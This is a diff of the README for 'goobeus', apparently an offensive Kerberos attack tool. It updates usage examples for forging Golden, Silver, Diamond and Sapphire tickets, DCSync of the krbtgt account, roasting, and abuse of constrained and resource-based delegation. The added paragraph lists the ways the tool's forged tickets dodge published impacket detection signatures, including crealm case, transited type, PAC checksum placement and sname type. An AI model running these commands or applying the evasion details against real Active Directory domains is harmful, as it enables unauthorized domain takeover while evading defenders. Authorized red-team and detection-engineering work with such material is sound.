@@ -98,23 +98,33 @@ goobeus -d corp.local -u admin -r <nt_hash> dcsync --user krbtgt --dc dc01.corp.
 
 ```bash
 # Forge Golden Ticket
-goobeus golden --domain corp.local --sid S-1-5-21-... --krbtgt <hash> --user fakeadmin
+goobeus -d corp.local golden --sid S-1-5-21-... --krbtgt <hash> --user fakeadmin
 
-# Forge Silver Ticket  
-goobeus silver --domain corp.local --sid S-1-5-21-... --rc4 <svc_hash> \
-  --service cifs/fileserver.corp.local --user admin
+# Forge Silver Ticket
+goobeus -d corp.local silver --sid S-1-5-21-... --hash <svc_key> \
+  --spn cifs/fileserver.corp.local --user admin
 
-# Forge Diamond Ticket (modify real TGT's PAC)
+# Forge Diamond Ticket (inflate your own PAC with extra group RIDs)
 goobeus -d corp.local -u lowpriv -p 'Password!' diamond \
-  --krbtgt <krbtgt_aes256> --impersonate Administrator
+  --krbtgt <krbtgt_aes256> --sid S-1-5-21-... --groups 512,519,520
 
 # Forge Sapphire Ticket (real PAC via S4U2Self+U2U)
 goobeus -d corp.local -u lowpriv -p 'LowPrivPass!' sapphire \
-  --krbtgt <krbtgt_aes256> --impersonate Administrator \
-  --sid S-1-5-21-... -o admin.ccache
+  --aeskey <krbtgt_aes256> --nthash <krbtgt_nthash> \
+  --impersonate Administrator -o admin.ccache
 ```
 
 > **Sapphire Tickets**: The most advanced ticket forgery technique. Uses S4U2Self with User-to-User authentication to obtain a real PAC from the target user, then transplants it into a forged TGT. The resulting ticket contains genuine group memberships from Active Directory, making it harder to detect than Golden/Diamond tickets.
+>
+> Goobeus's sapphire implementation goes further than impacket's `ticketer.py -impersonate` on several fingerprintable axes:
+> - Forged TGT inherits the **actual domain renew/lifetime policy** from the bootstrap AS-REP (vs ticketer's hardcoded `+24h` renew-till)
+> - `crealm` is emitted UPPERCASE matching real Windows KDCs (ticketer ships lowercase — a published impacket signature)
+> - `transited.tr-type=0` matches what KDCs emit on AS-REP TGTs (ticketer leaves it `=1`, inherited from the stolen TGS context)
+> - PAC `SERVER_CHECKSUM`/`PRIVSVR_CHECKSUM` stay in their KDC-emitted positions immediately after `LOGON_INFO` (ticketer reorders them to the end)
+> - Sapphire `sname` uses `NT_SRV_INST` for `krbtgt` like a real KDC (ticketer hardcodes `NT_PRINCIPAL`)
+> - PA-FOR-USER `userRealm` is uppercased to match real Windows clients
+>
+> Both `--aeskey` (krbtgt AES256) and `--nthash` (krbtgt RC4) are accepted; provide both when available so PAC re-signing preserves whatever checksum types the original PAC used (avoids a "checksum type changed" detection).
 
 ### Roasting Attacks
 
@@ -133,8 +143,8 @@ goobeus asreproast --domain corp.local --dc dc01.corp.local --users users.txt
 
 ```bash
 # S4U2Self + S4U2Proxy constrained delegation
-goobeus -d corp.local -u svc_sql -r <hash> s4u \
-  --impersonate administrator --msdsspn cifs/dc01.corp.local
+# Args are positional: <targetUser> [<targetSPN>]
+goobeus -d corp.local -u svc_sql -r <hash> s4u administrator cifs/dc01.corp.local
 
 # Resource-Based Constrained Delegation (RBCD) attack
 goobeus -d corp.local -t machine.kirbi rbcd --action attack \
@@ -221,8 +231,10 @@ goobeus describe --ticket admin.ccache
 # Convert between formats
 goobeus describe --ticket admin.kirbi --out admin.ccache
 
-# Hash password to Kerberos keys
-goobeus hash --password 'Password123!' --domain corp.local --user jsmith
+# Hash password to Kerberos keys (password via -p, or as a positional arg)
+goobeus -p 'Password123!' hash --domain corp.local --user jsmith
+# Or:
+goobeus hash --domain corp.local --user jsmith 'Password123!'
 
 # Change password via kpasswd
 goobeus -d corp.local -u jsmith -p 'OldPass!' changepw --new 'NewPass123!'
@@ -329,8 +341,7 @@ Both formats are fully supported for input and output. Output format is auto-det
 |--------|------|---------|
 | Password | `-p, --pass` | `-p "Password123!"` |
 | NTLM Hash | `-r, --rc4` | `-r aad3b435b51404eeaad3b435b51404ee` |
-| AES128 Key | `--aes128` | `--aes128 <32 hex chars>` |
-| AES256 Key | `-a, --aes` | `-a <64 hex chars>` |
+| AES Key | `-a, --aes` | `-a <hex>` (length determines AES128 vs AES256) |
 | Ticket File | `-t, --ticket` | `-t admin.kirbi` |
 
 ## Hash Output Formats
